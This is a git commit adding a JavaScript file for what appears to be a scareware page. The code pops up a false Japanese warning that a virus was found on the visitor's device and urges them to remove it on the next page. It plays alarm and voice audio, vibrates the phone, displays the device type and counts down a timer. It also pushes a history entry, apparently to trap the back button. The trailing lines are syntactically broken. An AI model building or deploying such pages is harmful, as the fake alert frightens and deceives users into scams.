992e1942c7ac1a715a690c0cb86f281e2bea00e6
Kumarin-yakyu <0v0sayu.rin@gmail.com>
2025-11-03 16:00:42 +0900

    Create script.js

---
+++ script.js
@@ -0,0 +1,33 @@
+function play_se(){
+   var warning = new Audio(`warning.mp3`);
+   var voice = new Audio(`voice.mp3`);
+   warning.play();
+   voice.play();
+   navigator.vibrate([200, 100, 200, 100, 200, 100, 200])
+   }
+
+
+  $(function(){
+  //ページの読み込み時に発動
+  $(`#test`).click(play_se);
+
+  var device = navigator.userAgent.match(/Android|iPhone|iPad/);
+  if (device == null){
+      device =  `端末`;
+  }
+  $(`#device`).text(device);
+
+  var time = 300;
+  setInterval(function(){
+      time--;
+      $(`#timer`).text(time);
+  }, 1000);
+});
+
+alert(`【警告】あなたの端末からウィルスを検知しました次のページから除去してください`)
+play_se();
+
+    history.pushState(null, null, null);
+    return;
+
+});
